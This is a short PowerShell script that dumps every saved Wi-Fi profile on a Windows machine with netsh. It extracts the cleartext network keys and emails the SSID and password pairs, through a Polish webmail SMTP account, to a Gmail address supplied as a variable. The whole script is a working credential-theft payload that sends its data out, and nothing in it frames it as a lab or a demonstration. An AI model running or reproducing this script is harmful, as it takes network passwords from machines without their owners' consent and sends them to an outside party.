$SmtpServer = "poczta.interia.pl" ; $SmtpPort = "587"
$secpasswd = ConvertTo-SecureString $Password -AsPlainText -Force
$user = $username + "@interia.pl"
$cred = New-Object System.Management.Automation.PSCredential ($user, $secpasswd)
$Subject = "WiFi"
$To = $Too + "@gmail.com"

$p = @()
$p += (netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)} | Select-String "Key Content\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ SSID=$name;PASS=$pass }} 

foreach ($pm in $p)
{
$Body += "<h3>SSID: 3333<br>PASSWORD: ::</h3>" -replace "::",$pm.PASS  -replace "3333",$pm.SSID
}

Send-MailMessage -From $user -to $To -Subject $Subject -Body $Body -SmtpServer $SMTPServer -port $SMTPPort -Credential $cred -UseSsl -BodyAsHtml
